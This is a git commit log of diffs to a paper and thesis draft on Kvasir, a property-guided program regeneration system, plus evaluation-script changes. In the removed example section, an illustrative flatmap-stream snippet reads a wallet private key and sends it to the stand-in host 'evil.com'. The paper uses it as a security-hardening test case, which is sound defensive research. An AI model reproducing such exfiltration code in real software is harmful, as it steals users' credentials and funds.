-    Variant & $P_{p}$ & $P_{n}$  \\
-    \midrule
-    \sys & \xxx & \xxx \\
-    GPT-4 & \xxx & \xxx \\
-    \bottomrule
-  \end{tabular}
-\end{table}
+% \begin{table}[h]
+%   \centering
+%   \caption{
+%     Planning precision: Number of tasks where the synthesized program satisfies positive properties ($P_p$) and avoids negative properties ($P_n$).
+%   }
+%   \begin{tabular}{lcc}
+%     \toprule
+%     Variant & $P_{p}$ & $P_{n}$  \\
+%     \midrule
+%     \sys & \xxx & \xxx \\
+%     \gptmodel & \xxx & \xxx \\
+%     \bottomrule
+%   \end{tabular}
+% \end{table}
 
@@
 unintended behaviors. For instance, in the \texttt{flatmap-stream} benchmark,
-GPT-4 often inclduded malicious side effects when the code appeared innocuous,
-whereas \sys generated provably pure rewrites by treating the source as
+\gptmodel often inclduded malicious side effects when the code appeared innocuous,
+whereas \sys generated pure rewrites by treating the source as
 untrusted and grounding regeneration in I/O behavior alone.
-Across all benchmarks, the planning step completes in under \xxx ms on average.
-% TODO: re-add this
-% adding negligible latency compared to synthesis time. Moreover, by minimizing
-% the number of properties to extract and verify, planning reduces the total time
-% and resource usage of the regeneration pipeline.
+Across all benchmarks, the planning step completes in under 50ms on average.
+Similalry, in the \ttt{Q\_rsqrt} benchmark, \gptmodel often produces bit-level
+manipulations that are not idiomatic in Haskell, while \sys generates a simple
+and idiomatic Haskell function that computes the inverse square root.
+This is guided by the fact the \sys extracts and provides to its backend model only the function signature 
+and length of the program, which it minimizes, without including the original source code,
+which as shown in the experimental results makes the model overfit its regeneration to it.
+\sys's I/O pair extraction also provides confidence that 
+the regenerated program has the same client-visible behavior as the original one, while 
+prompting a model like \gptmodel would always require manual inspection or the presence 
+of developer tests to verify the correctness of the regeneration.
 
@@
 \section{Discussion and Limitations}
+\label{sec:discussion}
 
@@
 \heading{Trust model and correctness}
-\sys does not provide formal guarantees of semantic equivalence to the original program.
-Instead, correctness is defined relative to a set of enforced properties.
+\sys
+does not provide formal guarantees
+of semantic equivalence
+to the original program.
+Instead,
+correctness is defined relative to a set of enforced properties.
 This means that correctness is only as strong as the property definitions and associated verifiers.
-In the presence of underspecified or unverifiable goals, regenerated code may exhibit unanticipated behavior, even if it passes all checks.
+In the presence of underspecified or unverifiable goals,
+regenerated code
+may exhibit unanticipated behavior,
+even if it passes all checks.
 
 \heading{LLM limitations}
-The generative synthesis phase is subject to the inherent variability and failure modes of large language models.
-These include hallucinations, sensitivity to prompt phrasing, and inconsistency under minor input changes.
-\sys does not mitigate these risks, but allows their detection through post-hoc verification.
-In cases where the system finds no satisfactory candidate, regeneration may fail and require manual intervention.
+The generative synthesis phase
+is subject to the inherent variability and failure modes
+of large language models.
+These include hallucinations,
+sensitivity to prompt phrasing,
+and inconsistency
+under minor input changes.
+\sys does not mitigate these risks,
+but allows their detection
+through post-hoc verification.
+In cases where the system finds no satisfactory candidate,
+regeneration fails.
 
 \heading{Language-specific support}
-Although some components of \sys are language-agnostic (\eg logic-based planning), others---particularly extraction and verification plugins are not.
-Supporting a new language requires implementing language-specific analyzers and constraints. This modularity is deliberate, but it does limit out-of-the-box generality.
-Work on a unified language representation~\cite{koppel2018onetool,bap2011,dillig2009sail}, is relevant to overcomming this limitation.
-The current \sys prototype supports Python, JavaScript, Haskell, and C.
+Although some components of \sys are language-agnostic (\eg logic-based planning),
+others---particularly extraction and verification plugins are not.
+Supporting a new language
+requires implementing language-specific analyzers and constraints.
+This modularity is deliberate,
+but it does limit out-of-the-box generality.
+Work on a unified language representation~\cite{koppel2018onetool,bap2011,dillig2009sail},
+is relevant to overcomming this limitation.
+The current \sys prototype
+supports Python, JavaScript, Haskell, and C.
 
 \heading{Future directions}
-Extensions that could improve \sys's capabilities include richer property languages (\eg temporal or dataflow properties), tighter integration with formal verification tools, and cross-component reasoning for coordinated rewrites.
+Extensions that could improve \sys's capabilities include richer property languages (\eg temporal or dataflow properties~\cite{azzopardi2023ltl,handa2021orderawaredataflowmodelparallel}), tighter integration with formal verification tools, and cross-component reasoning for coordinated rewrites.
+Furthermore, performance-oriented transformations could be potent additions, allowing \sys to transform the program across dimensions like runtime, parallelizability, or memory usage.
 Additionally, integrating counterfactual generation techniques~\cite{Cabalar_2020} could help explain why certain regeneration goals are infeasible or conflicting.
@@
 \section{Conclusion}
+This paper introduced \sys, a system for property-guided program regeneration
+that bridges the flexibility of large language models with the precision of
+logic-driven planning.
+By allowing developers to declaratively specify
+transformation goals as logical constraints, \sys elevates LLM-assisted program
+trasnformations to a controllable, interpretable, and iterative synthesis-verification
+process.
+Evaluation demonstrates that \sys produces high-quality regenerations
+across diverse tasks, outperforming naive prompting baselines in correctness,
+controllability, and resilience to adversarial or obfuscated inputs.
+
+\sys opens the door to a new class of synthesis tools that combine symbolic
+reasoning and neural generation under a unified, extensible framework.
+As program synthesis systems grow increasingly reliant on LLMs, we believe the
+future lies in harnessing their generative power within a framework that retains
+correctness, explainability, and developer control as first-class citizens.
 

### 2025-06-17 scripts/eval.sh
Add another Rosetta eval
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@ -19,6 +19,7 @@ kvasir -vvv -i "$input"/npm/left-pad/index.js -q "$input"/query/io_same.pl -o "$
 "$scripts"/naivellm.py "$input"/rosetta/helloworld.js 'Turn this program into Haskell code' > "$output"/naivellm/rosetta-helloworld.hs
 "$scripts"/naivellm.py "$input"/rosetta/helloworld.js 'Turn this program into Python code' > "$output"/naivellm/rosetta-helloworld.py
 "$scripts"/naivellm.py "$input"/rosetta/median.js 'Turn this program into Python code' > "$output"/naivellm/rosetta-median.py
+"$scripts"/naivellm.py "$input"/rosetta/median.js 'Turn this program into Haskell code' > "$output"/naivellm/rosetta-median.hs
 "$scripts"/naivellm.py "$input"/rosetta/rot13.js 'Turn this program into Python code' > "$output"/naivellm/rosetta-rot13.py
 "$scripts"/naivellm.py "$input"/rosetta/readfile.js 'Turn this program into Python code' > "$output"/naivellm/rosetta-readfile.py
 

### 2025-06-17 paper/draft.tex
Replace xxxs
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
 
-After \xxx seconds, \sys generates the following program:
+After 30.4 seconds and one attempt, \sys generates the following program:
 \begin{minted}[frame=lines]{js}
@@
 to generate a Haskell program that satisfies the same I/O behavior.
-After \xxx seconds, having generated \xxx I/O pairs, \sys produces the following
+After 32.2 seconds, having generated 20 I/O pairs, \sys produces the following
 Haskell program (truncated for brevity):
@@
 the model to regenerate the program until it can make no improvements or there is a negligible difference after two consecutive iterations.
-After \xxx seconds, and \xxx iterations, \sys produces the following program:
+After 15.2 seconds, and two iterations, \sys produces the following program:
 \begin{minted}[frame=lines]{c}
@@
 \sys wraps the node process with monitors that extract the SQL queries 
-sent to the database for \xxx generated inputs.
-Then, after \xxx seconds and \xxx attempts, it arrives at two functions $f_1$, and 
+sent to the database for 24 generated inputs.
+Then, after 20.4 seconds and two attempts, it arrives at two functions $f_1$, and 
 $f_2$, where their composition $f_2(f_1, \_)$, is equivalent to the original \ttt{getAlbumsByArtist} function across these inputs.
@@
 
-% \begin{table}[h]
-%   \centering
-%   \caption{
-%     Planning precision: Number of tasks where the synthesized program satisfies positive properties ($P_p$) and avoids negative properties ($P_n$).
-%   }
-%   \begin{tabular}{lcc}
-%     \toprule
-%     Variant & $P_{p}$ & $P_{n}$  \\
-%     \midrule
-%     \sys & \xxx & \xxx \\
-%     \gptmodel & \xxx & \xxx \\
-%     \bottomrule
-%   \end{tabular}
-% \end{table}
-
 \sys consistently satisfies more of the declared properties while avoiding

### 2025-06-17 paper/draft.tex
Add key results
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
 
-% \heading{Key results}
-% \sys is able to effectively transform programs across a variety goals.
+\heading{Key results}
+\sys is able to effectively transform all programs across the above tasks,
+producing high-quality outputs that satisfy user-specified constraints. A total
+of six plugins were required to perform the above transformations, each
+contributing either a set of extracted and verified properties, or a
+transformation, and a set of pre- and post-conditions that the logic engine
+uses to construct the regeneration plan.
 

### 2025-06-19 paper/draft.tex
Make fixes
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
-\documentclass[noacm,sigplan]{acmart}
+\documentclass[noacm,sigplan,review]{acmart}
 
@@
 \usepackage{textgreek}
+\usepackage{oplotsymbl}
 
@@
 }
+  \label{fig:overview}
 \end{figure}
@@
 Recent advances in large language models (LLMs) have opened new possibilities for automating program transformation and synthesis tasks, making them attractive tools for software evolution, albeit with caveats.
-This flexibility has positioned them as attractive tools for software evolution.
+This flexibility has positioned them as attractive tools for software evolution
+compared to traditional program synthesis techniques, which often struggle
+to scale to real-world settings or across languages and require significant developer involvement~\cite{reynolds2019syguscomp,leino2016dafny,wu2023programming,dynamoth2016,cambronero2019active}.
 LLMs can translate code across languages~\cite{ou2025enhancingllmbasedcodetranslation},
@@
 language, trace equivalence, or modular structure.
-Given a source program and
-such a query, \sys extracts a minimal set of relevant properties, guided by a
+As shown in \cref{fig:overview}, given a source program and
+a query, \sys extracts a minimal set of relevant properties, guided by a
 logic engine and a domain-specific knowledge base, and synthesizes a new
@@
 a new program that satisfies the query.
-\sys casts this process as a
-maximum-satisfiability (MaxSAT) problem~\cite{sung2006maximum}, optimizing for the smallest extraction
-effort necessary to enable transformation.
+\sys casts this process as an optimization problem, where the goal is to find a
+program that satisfies the query while preserving as much of the original
+program’s properties as possible.
 If the query is unsatisfiable under
@@
 \sys regenerates correctly all npm and PyPi utilities, it does not introduce and sideffectful or malicious behavior.
-The synthesized programs reveal several interesting insights and patterns.
+The synthesized programs reveal interesting insights and patterns.
 \sys-generated code often lacks the optimizations commonly
@@
 
+% \begin{table*}
+%   \centering
+%   \caption{
+%     \textbf{Comparison of transformation paradigms.}
+%     \sys combines symbolic planning, property reasoning, and guided regeneration.
+%   }
+%   \label{tbl:comparison}
+%     \begin{tabular}{lcccccccc}
+% \toprule
+% \textbf{Approach} & 
+% \rotatebox{90}{\textbf{Uses Input}} &
+% \rotatebox{90}{\textbf{Decl. Goals}} &
+% \rotatebox{90}{\textbf{Neg. Const.}} &
+% \rotatebox{90}{\textbf{Opt. Support}} &
+% \rotatebox{90}{\textbf{Modular}} &
+% \rotatebox{90}{\textbf{Explainable}} &
+% \rotatebox{90}{\textbf{Scoped}} & 
+% Source \\
+% \midrule
+% Classical Synthesis & $\squad$ & $\squadfill$ & $\squad$ & $\squad$ & $\squad$ & $\squad$ & $\squad$ & \cite{alur2013sygus, solar2008sketch} \\
+% Refactoring Tools & $\squadfill$ & $\squad$ & $\squad$ & $\squad$ & $\squad$ & $\squadfillhr$ & $\squadfillhr$ & \cite{} \\
+% PBE Synthesis & $\squad$ & $\squadfill$ & $\squad$ & $\squadfill$ & $\squad$ & $\squad$ & $\squad$ & \cite{} \\
+% CEG Synthesis & $\squadfill$ & $\squadfill$ & $\squadfill$ & $\squadfill$ & $\squad$ & $\squad$ & $\squad$ & \cite{solar2008sketch} \\
+% Pure LLMs & $\squad$ & $\squad$ & $\squad$ & $\squad$ & $\squad$ & $\squad$ & $\squad$ & \cite{} \\
+% \textbf{\sys} & $\squadfill$ & $\squadfill$ & $\squadfill$ & $\squadfill$ & $\squadfill$ & $\squadfill$ & $\squadfill$ & (this paper) \\
+% \bottomrule
+% \end{tabular}
+% \end{table*}
+
 \heading{Program synthesis}
@@
 Classical techniques emphasize correctness and
-interpretability, synthesizing programs from specifications~\cite{alur2013syntax, feser2015synthesizing, gulwani2011automating},
-type constraints \cite{polikarpova2016program},
-or examples \cite{jha2010oracle, raza2018disjunctive, singh2016blinkfill}.
+interpretability, synthesizing programs from specifications~\cite{alur2013syntax, feser2015synthesizing, gulwani2011automating,leino2016dafny},
+type or syntax constraints \cite{polikarpova2016program,reynolds2019syguscomp},
+or examples~\cite{jha2010oracle, raza2018disjunctive, singh2016blinkfill,wu2023programming},
+which are provided either by users or automatically inferred~\cite{cambronero2019active,harp:ccs:2021}
 These works often target narrowly
@@
 responsive to property-based requirements.
-This design combines
-the scalability of LLM-assisted program sysnthesis with the controllability and robustness of symbolic
-reasoning. % TODO: focus on that \sys focuses on this specific problem domain
 
@@
 The evolution and maintenance of software systems often involve transformations
-such as refactoring, translation, or security hardening. Foundational work on
-refactoring~\cite{Fowler99} and its taxonomy~\cite{Mens04} characterizes the
-space of behavior-preserving modifications. More recent perspectives emphasize
-developer experience and usability, particularly in the context of APIs~\cite{Myers16}.
+such as refactoring~\cite{Fowler99,Mens04,Myers16}, translation, or security hardening. % TODO: Add more citations
 
@@
 domain-specific templates. Verification-based methods such as \textsc{Dafny}
-\cite{Leino10} and \textsc{CBMC} \cite{Clarke04} ensure functional correctness
+\cite{leino2016dafny} and \textsc{CBMC} \cite{Clarke04} ensure functional correctness
 but require heavy formalization.
@@
 synthesize a feasible transformation plans.
-This enables global reasoning across program components and enforces
-user-specified constraints that are difficult for neural models to respect.
-In addition, it offers a level of explainability that is useful in case transformations end up incorrect.
 
@@
 
+\appendix
+
+\section{A Primer on Answer Set Programming (ASP)}
+\label{sec:asp}
+
+\emph{Answer Set Programming (ASP)} is a declarative logic programming paradigm
+that generalizes Datalog by supporting nonmonotonic reasoning,
+negation-as-failure, and optimization. \sys uses ASP to represent and solve
+regeneration planning tasks by encoding properties, constraints, and goals as
+logic rules.
+
+\heading{From Datalog to ASP}
+Like Datalog, ASP programs consist of rules of the form:
+\begin{verbatim}
+head :- body.
+\end{verbatim}
+
+But unlike Datalog
+ASP supports \emph{negation-as-failure} using \texttt{not}
+ASP allows \emph{disjunctions} and \emph{constraints}
+ASP evaluates programs under the \emph{stable model semantics}, which may yield
+multiple answer-sets (models), each representing a consistent solution
+
+\heading{Example: Feature Selection}
+\begin{verbatim}
+{ select(a); select(b); select(c) }.
+
+:- select(a), select(b).   % a and b are incompatible
+
+#maximize { X : select(X) }.   % Prefer selecting more features
+\end{verbatim}
+
+This program searches over subsets of \texttt{\{a,b,c\}}, excludes those
+violating constraints, and returns models with maximal selections.
+
 \end{document}

### 2025-06-19 scripts/eval.sh
Add full evaluation
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@ -10,10 +10,46 @@ scripts="$top/scripts"
 mkdir -p "$output"
 mkdir -p "$output"/naivellm
 
-# Evaluate each task
+# Apply Kvasir
 kvasir -vvv -i "$input"/micro/math.js -q "$input"/query/to_haskell.pl -o "$output"/math.hs
 kvasir -vvv -i "$input"/micro/Q_rsqrt.c -q "$input"/query/min_len.pl -o "$output"/Q_rsqrt_idiomatic.c
 kvasir -vvv -i "$input"/npm/left-pad/index.js -q "$input"/query/io_same.pl -o "$output"/left-pad.js
+
+kvasir -vvv -i "$input"/npm/array-ify/index.js -q "$input"/query/io_same.pl -o "$output"/npm-array-ify.js
+kvasir -vvv -i "$input"/npm/has-values/index.js -q "$input"/query/io_same.pl -o "$output"/npm-has-values.js
+kvasir -vvv -i "$input"/npm/is-nan/index.js -q "$input"/query/io_same.pl -o "$output"/npm-is-nan.js
+kvasir -vvv -i "$input"/npm/is-number/index.js -q "$input"/query/io_same.pl -o "$output"/npm-is-number.js
+kvasir -vvv -i "$input"/npm/is-string/index.js -q "$input"/query/io_same.pl -o "$output"/npm-is-string.js
+kvasir -vvv -i "$input"/npm/just-flush/index.cjs -q "$input"/query/io_same.pl -o "$output"/npm-just-flush.js
+kvasir -vvv -i "$input"/npm/left-pad/index.js -q "$input"/query/io_same.pl -o "$output"/npm-left-pad.js
+kvasir -vvv -i "$input"/npm/lowercase-keys/index.cjs -q "$input"/query/io_same.pl -o "$output"/npm-lowercase-keys.js
+kvasir -vvv -i "$input"/npm/math-factorial/index.js -q "$input"/query/io_same.pl -o "$output"/npm-math-factorial.js
+kvasir -vvv -i "$input"/npm/string-repeating/index.cjs -q "$input"/query/io_same.pl -o "$output"/npm-string-repeating.js
+
+kvasir -vvv -i "$input"/pypi/left_pad.py -q "$input"/query/io_same.pl -o "$output"/pypi-left_pad.py
[…]

### 2025-06-20 docs/thesis/frontmatter/abstract.tex
Add thesis
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

--- 2025-06-17 paper/draft.tex
@@
-\documentclass[noacm,sigplan]{acmart}
+\section*{Abstract}
+\addcontentsline{toc}{section}{Abstract}
 
-% \acmSubmissionID{PAPER ID}
-\renewcommand\footnotetextcopyrightpermission[1]{}
-\settopmatter{printfolios=false,printacmref=false}
-
-\usepackage{setspace}
-\usepackage{enumerate}
-\usepackage{algorithm2e}
-\usepackage{algpseudocode}
-\usepackage{graphics}
-\usepackage{xparse} 
-\usepackage{xspace}
-\usepackage{multirow}
-\usepackage{csvsimple}
-\usepackage{balance}
-\usepackage{minted}
-\usepackage{xcolor}
-\usepackage{nicefrac}
-\usepackage{siunitx}
-\usepackage{array,framed}
-\usepackage{booktabs}
-\usepackage{color}
-\usepackage{soul}
-\usepackage{float}
-\usepackage{epsfig}
-\usepackage{wrapfig}
-\usepackage{graphics}
-\usepackage{graphicx}
-\usepackage{subcaption}
-\usepackage{adjustbox}
-\usepackage{csquotes}
-\usepackage{cleveref}
-\usepackage{dirtytalk}
-\usepackage{textgreek}
-
-\def\eg{{\em e.g.}, }
-\def\ie{{\em i.e.}, }
-\def\etc{{\em etc.}\xspace}
-\def\vs{{\em vs.}\xspace}
-
-\def\gptmodel{{GPT-4o}\xspace}
-
-\newcommand{\todo}[1]{\hl{\textbf{TODO:} #1}\xspace}
-\newcommand{\sys}{{\scshape Kv{\textalpha}sir}\xspace}
-\newcommand{\rf}[1]{\ref{#1}}
-\newcommand{\sx}[1]{(\S\ref{#1})}
-\newcommand{\cf}[1]{(\emph{Cf}.\S\ref{#1})}
-\newcommand{\se}[1]{\S\ref{#1}}
-\newcommand{\fg}[1]{Fig.~\ref{#1}}
-\newcommand{\heading}[1]{\vspace{2pt}\noindent\textbf{\emph{#1}}:\enspace}
-\newcommand{\ttt}[1]{\texttt{#1}\xspace}
-\newcommand{\xxx}{\colorbox{red!30}{xxx}\xspace}
-\newcommand{\promptbox}[1]{\hspace*{-0.0135\columnwidth}\fbox{\parbox[t]{0.95\columnwidth}{\tt{#1}}}}
-
-\crefformat{section}{\S#2#1#3}
-\crefmultiformat{section}{\S#2#1#3}{--\S#2#1#3}{, \S#2#1#3}{ and \S#2#1#3}
-
-\begin{document}
-
-\title{\sys: Controllable Program Regeneration}
-\author{Evangelos Lamprou}
-
-% Use cases for something like this include:
-% - program repair
-% - turning insecure code into secure code by removing side-effects
-% - transforming a program in language A to language B
-% - turning a program into a more idiomatic version of the same language
-% - having a program use a different API
-% - have a program be more amendable to parallelization
-% - have a program be more amendable to further analysis or transformation
-
-\begin{abstract}
 Modern software systems are constantly evolving—requiring developers to
@@
   developer guidance.
-\end{abstract}
-\maketitle
-
-\section{Introduction}
-\begin{figure}[t]
-  % https://docs.google.com/drawings/d/1LAmdVYjfAID24eSM-hl5PRhVg9fRMJMWYETsvvcyAuU/edit?usp=sharing
-  \includegraphics[width=\columnwidth]{figs/kvasir_overview.pdf}
-  \caption{\textbf{\sys overview}
-Given a transformation query, and a source program, \sys extracts a minimal set
-  of properties,
-  guided by a logic engine and knowledge base.
-  It then synthesizes a new program $P'$ that satisfies the query, verifying
-  that wanted properties are present and unwanted properties are absent in $P'$.
-}
-\end{figure}
-
-% insights: modular programs, advances in LLMs, need for a strictly declarative interface
-
-% Mention that:
-% 1. They have shown great promise in program synthesis + 
-% 2. They can not do negative reasoning well - 
-% 3. Their output are often closely aligned to their inputs. They are gullible (susceptible to adversarial inputs). -
-% 4. Difficult to verify correctness of outputs against certain properties. The
-%    user cannot easily set requirements or say output should be within a range of
-%    acceptance
-
-Modern software systems evolve constantly.
-Developers refactor legacy code~\cite{Fowler99,Mens04,facebook2010redesigns,dropbox2014syncengine},
-adapt libraries to changing APIs~\cite{dig2005role,kula2017empiricalstudyimpactrefactoring},
-translate components across languages~\cite{manzoor_cli_python,gaultier_rewrite_cpp},
-and patch security vulnerabilities~\cite{ikegami2022userefactoringsecurityvulnerability,schneier2013security_vulnerabilities}.
-These transformations, are often brittle, time-consuming, and require significant expertise.
-
-Recent advances in large language models (LLMs) have opened new possibilities for automating program transformation and synthesis tasks, making them attractive tools for software evolution, albeit with caveats.
-This flexibility has positioned them as attractive tools for software evolution.
-LLMs can translate code across languages~\cite{ou2025enhancingllmbasedcodetranslation},
-refactor complex modules~\cite{ziftci2025migrating},
-and even generate entire components from scratch~\cite{huynh2025largelanguagemodelscode}.
-However, surface-level patterns in the input shape their outputs~\cite{yang2025evaluatinggeneralizationcapabilitieslarge},
-they struggle with negative constraints~\cite{hwang2024thinkpinkelephant,jiang2024llmsdreamelephantswhen},
-often overfit to spurious input cues~\cite{xu2023llmfoolitselfpromptbased, wu2023deceptpromptexploitingllmdrivencode},
-and lack mechanisms for enforcing precise behavioral properties on the generated code~\cite{roh2025breakthechainreasoningfailuresllms}.
-As a result, developers must prompt and steer them through brittle heuristics or manual trial-and-error, leading to workflows that are difficult to audit, integrate, or systematically reason about.
-Bridging this gap calls for a declarative interface---one that allows developers to specify explicit semantic constraints and transformation goals, and to reason about their satisfaction in a principled way.
-
-This paper present \sys, a system for \emph{controllable program regeneration}.
-\sys allows users
-to express transformation goals declaratively, as logical constraints over
-program properties such as input/output behavior, side-effect freedom, target
-language, trace equivalence, or modular structure.
-Given a source program and
-such a query, \sys extracts a minimal set of relevant properties, guided by a
-logic engine and a domain-specific knowledge base, and synthesizes a new
-program that satisfies the desired constraints.
-
-Three key insights shape the design of \sys.
-First, modern software is highly modular, making it feasible to reason about transformations at the granularity of individual components or functions.
-Second, the program regeneration setting provides a unique advantage: the original program serves as a concrete ground-truth, enabling semantic comparisons and verification of the transformed output, something impossible in traditional synthesis tasks.
-Third, the underlying synthesis technology---particularly LLMs---is evolving rapidly; a declarative interface that harnesses this progress without disrupting the framework's end user.
-
-Guided by these insights, \sys casts transformation as a constrained synthesis problem.
-At its core is a property-driven pipeline: users express goals as logical constraints over semantic properties, such as input/output behavior, side-effect freedom, target language, or structural modularity.
-\sys extracts a set of relevant properties, derived from its logic engine and a domain-aware knowledge base, and synthesizes a new program that satisfies the specified constraints.
-If no such program exists, \sys returns a failure explanation from the unsatisfiable core.
-
-\heading{Deployment scenarios and limitations}
-\sys supports a range of deployment scenarios.
-It is particularly well-suited for use during maintenance and auditing phases, where developers seek to refactor or replace components, especially when the original code is difficult to understand, modify, or is unavailable and the component exists only as a binary.
-It can also assist during development, for instance when integrating third-party modules that must be adapted to local conventions or hardened against security vulnerabilities.
-However, \sys is not designed for whole-program synthesis or large-scale migrations.
-Its strength lies in scoped regeneration tasks, typically at the granularity of a function, method, or small module---where transformation goals can be explicitly stated and verified in isolation.
-To this end, \sys functions not only as a standalone tool but also as a
-library, where other components can invoke it as a programmable,
-constraint-guided regeneration module.
-
-% Leverages insights: (1) modern applications highly modular (2) the problem of LLM-assisted program transformations needs to be transformed in a way that a ground truth is readily available: the original program
-% (3) towards the generality and longevity of this solution the interface needs to be purely declarative, to allow independent progress of the underlying comopnents to give automatic benefits
-
-% TODO: Add section references
-\heading{Contributions}
-The paper's contributions are:
-\begin{itemize}
-  \item A property-aware transformation framework, combining logic-based reasoning, and LLM-assisted program synthesis~(\cref{sec:design});
- \item A declarative interface and accompanying DSL for program transformation, allowing users to express semantic goals as logical queries over properties of the regenerated program~(\cref{sec:dsl});
- \item A verification architecture that checks synthesized programs against the specified properties, providing feedback for refinement~(\cref{sec:verification});
- \item An empirical evaluation demonstrating \sys's effectiveness and scalability across transformation scenarios~(\cref{sec:evaluation}).
-\end{itemize}
-
-We evaluate \sys across a diverse set of transformation tasks~(\cref{sec:evaluation}), including:
-	security hardening, by stripping latent malicious behavior while preserving intended functionality;
-	cross-language translation, by regenerating semantically equivalent programs in new languages;
-	idiomatic rewriting, by producing safer and more portable variants of legacy code;
-	modular decomposition, by restructuring monolithic components into composable parts.
-\sys is able to effectively regenerate programs across these tasks, producing high-quality outputs that satisfy user-specified constraints while also discovering transformation strategies that were not immediately obvious to the authors.
-
-\heading{Availability}
-The \sys prototype in available as an open-source MIT-licensed artifact at:
-\begin{center}
-  \url{https://github.com/vagos/kvasir}
-\end{center}
-
-\section{Example}
-\label{sec:example}
-\sys enables users to specify transformation goals declaratively.
-Logical constraints over properties of the
-regenerated program express these goals. Examples are input-output equivalence, side-effect elimination,
-target language, lines of code, and others.
-
-Given a program and a query over desired properties, \sys selects a minimal set
-of properties to extract from the original program, then attempts to synthesize
-a new program that satisfies the query.
-\sys casts this process as a
-maximum-satisfiability (MaxSAT) problem~\cite{sung2006maximum}, optimizing for the smallest extraction
-effort necessary to enable transformation.
-If the query is unsatisfiable under
-the constraints or transformations, \sys issues an error
-message, showing the conflict.
-
-This section shows the application of \sys
-to three distinct program transformation tasks, 
-targeting security, language translation, compatibility,
-idiomaticity, and modularity.
-
-\heading{A compromised javascript library}
-The \texttt{flatmap-stream} library was implicated in a high-profile
-supply-chain attack that exfiltrated Bitcoin credentials~\cite{ev:eurosec:2022}.
-While it preserved
-client-observable behavior, the library accessed the filesystem, network, and
-global state under specific conditions.
-Program regeneration can automatically remove possible malicious payloads
-while preserving the original program's observable behavior,
-especially in this scenario, where the attack is highly obfuscated and 
-activates under precise conditions~\cite{harp:ccs:2021}.
-\begin{minted}[frame=lines]{js}
-module.exports = function (stream, fn) {
- if (process.env.PRODUCTION) {
-  const priv = copay.getKeys()?.[0]?.priv;
-  if (priv && wallet.balance > 0) {
-    http.request({ hostname: 'evil.com' })
-        .send({ priv });
-  }} return flatten(steam).apply(fn); };
-\end{minted}
-
-\begin{wrapfigure}[3]{r}{.5\columnwidth}
-\vspace{-10pt}
-\begin{minted}{prolog}
-equal(graph(P), graph(P_)).
-pure(P_).
-\end{minted}
-\end{wrapfigure}
-To the right is a program written in the \sys DSL to express this intent.
-This query requires the regenerated program \ttt{P\_} to exhibit the same I/O behavior,
-but forbids side-effects.
-\sys first arrives at a minimal set of properties to extract from the
-original program, given its knowledge base and the query.
-This set is $\{\texttt{funcs(F, P), graph(F), sig(F), pure(P)}\}$, where
-\texttt{funcs(F, P)} extracts the set of functions defined in the original program
-using a language-aware component that either parses the program source or extracts
-symbols from the binary,
-\texttt{graph(F)} extracts the I/O behavior of each function
-by providing its source code to an LLM instance and asking it to generate a set of
-inputs; with corresponding outputs generated by executing the original program,
-and \texttt{sig(F)} extracts each function's signature.
-The, \texttt{pure(P)} property means that \sys will confirm after regeneration that the original program is (obviously) pure
-using static analysis.
-
-After 30.4 seconds and one attempt, \sys generates the following program:
-\begin{minted}[frame=lines]{js}
-module.exports = function(stream, fn) {
-  return stream.map(fn); };
-\end{minted}
-
-Building on the same source, \sys can perform cross-language
-translation. 
-Here, the goal is to regenerate a semantically equivalent version
-of \texttt{flatmap-stream} in Haskell, to enable integration with a
-Haskell-based pipeline or facilitate formal reasoning.
-
-\begin{wrapfigure}[3]{r}{.5\columnwidth}
-\vspace{-10pt}
-\begin{minted}{prolog}
-equal(graph(P), graph(P_)).
-language(P_, haskell).
-\end{minted}
-\end{wrapfigure}
-The query requests preservation of I/O behavior and translation to Haskell. The
-logic engine deduces that extracting I/O traces and the function signature is
-sufficient; the knowledge base automatically associates the target language
-\texttt{Haskell} with purity.
-\sys transforms each extracted I/O example into an equivalent one in Haskell (\eg 
-the pair $\langle\texttt{([1,[2,3]], (x)=>x+1)}\to\texttt{[2,3,4]}\rangle$ 
-becomes $\langle(\texttt{[1, [2,3]], Js("(x)=>x+1"))}\to\texttt{[2,3,4]}\rangle$).
-Finally, it provides the transformed examples to a new LLM instance, prompting it
-to generate a Haskell program that satisfies the same I/O behavior.
-After 32.2 seconds, having generated 20 I/O pairs, \sys produces the following
-Haskell program (truncated for brevity):
-\begin{minted}[frame=lines]{haskell}
-flatmap :: (a -> b) -> NestedList a -> [b]
-flatmap f (Elem x) = [f x]
-flatmap f (List x) = concatMap (flatmap f) x
-\end{minted}
-
-\heading{An unidiomatic c program}
-The fast inverse square root routine from the Quake III
-engine~\cite{fast_inv_sqrt}
-is a classic example of performance-oriented low-level programming.
-The original implementation exploits type punning to manipulate IEEE
-floats at the bit level---an optimization that relies on undefined behavior:
-
-\begin{minted}[frame=lines]{c}
-float Q_rsqrt(float number) {
- long i; float x2, y;
- const float threehalfs = 1.5F;
- x2 = number * 0.5F; y  = number;
- i  = * ( long * ) &y; // evil bit level hack
- i  = 0x5f3759df - ( i >> 1 );
- y  = * ( float * ) &i;
- y  = y * ( threehalfs - ( x2 * y * y ) );
- return y;
-}
-\end{minted}
-
-The following query for \sys uses lines-of-code a coarse metric of
-idiomaticity. \sys will regenerate the program, minimizing this metric, while
-preserving its I/O behavior.
-\begin{wrapfigure}[3]{r}{.5\columnwidth}
-  \vspace{-5pt}
-  \begin{minted}{prolog}
-equal(graph(P), graph(P_)).
-#min len(P_).
-  \end{minted}
-\end{wrapfigure}
-\sys extracts the set of properties \ttt{sig(F)} and \ttt{graph(F)} from the original program, where \texttt{sig(F)} is the
-signature of the function (including its name, return type, and arguments), and \texttt{graph(F)} is the I/O behavior of the function
-on a set of generated inputs.
-In this case, where the goal is to optimize an aspect of the program, \sys will re-prompt
-the model to regenerate the program until it can make no improvements or there is a negligible difference after two consecutive iterations.
-After 15.2 seconds, and two iterations, \sys produces the following program:
-\begin{minted}[frame=lines]{c}
-#include <math.h>
-float Q_rsqrt(float number) {
-    return 1.0f / sqrtf(number);
-}
-\end{minted}
-The regenerated version is easier to verify, portable across compilers, and
-avoids undefined behavior.
-A user could have also provided performance requirements using 
-the \ttt{time(P)} property to further guide the regeneration process.
-In this case, \sys would have run the two functions inside a tight loop and 
-would have aborted the regeneration process if the performance of the generated
-program was not within an acceptable user-defined threshold.
-
-\heading{A rigid music application}
